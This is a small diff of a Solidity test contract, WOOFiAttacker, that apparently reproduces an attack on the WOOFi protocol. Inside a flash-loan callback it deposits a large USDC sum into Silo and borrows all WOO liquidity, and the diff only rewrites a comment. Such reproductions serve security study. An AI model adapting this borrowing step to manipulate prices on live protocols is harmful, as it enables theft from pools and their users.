@@ -131,7 +131,7 @@ contract WOOFiAttacker is Test {
         bytes32 totalFees,
         bytes calldata data
     ) external returns (bytes32) {
-        // deposit USDC and borrow all the WOO liquidity (idk if Woo oracle  using Silo for pricing or whether this is just to get even bigger WOO balance)
+        // deposit USDC and borrow all the WOO liquidity from Silo
         SILO.deposit(USDC, 7000000000000, true);
         uint256 amount = SILO.liquidity(WOO);
         SILO.borrow(WOO, amount);
